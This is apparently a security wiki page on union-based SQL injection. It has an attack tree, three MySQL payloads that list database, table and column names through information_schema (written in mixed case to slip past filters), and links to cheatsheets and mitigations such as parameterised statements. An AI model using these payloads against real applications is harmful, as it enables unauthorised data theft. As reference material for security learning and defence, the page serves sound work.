# Extracting data from the database

## Attack tree

```text
1 SQL injection extract data from 
    1.1 Find out if the database is vulnerable (AND)
        1.1.1 Inject data in the query without breaking it
    1.2 Find the amount of columns (AND)
    1.3 Find which columns accept queries (AND)
    1.4 Build an UNION SELECT SQL segment that will modify the WHERE clause and make it true
    1.5 Inject SQL statements into the column
    1.4 Post exploitation
```
## Examples

Database names:
```text
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
```

Tables of a database:
```text

-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
```

Column names:
```text
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

## Notes

Union-based SQL injection is the most common of all the SQL injections. It uses the UNION statement to integrate two or 
more SELECT statements in a SQL query thereby obtaining data illegally from the database.

## Cheatsheets
* [Detect number of columns](cheatsheets:docs/databases/number-of-columns)
* [MySQL commands](cheatsheets:docs/databases/mysql-commands)

## Mitigations
* [Parameterised statements](app-mitigations:docs/databases/parameterised)
* [Input validation](app-mitigations:docs/databases/Input-validation)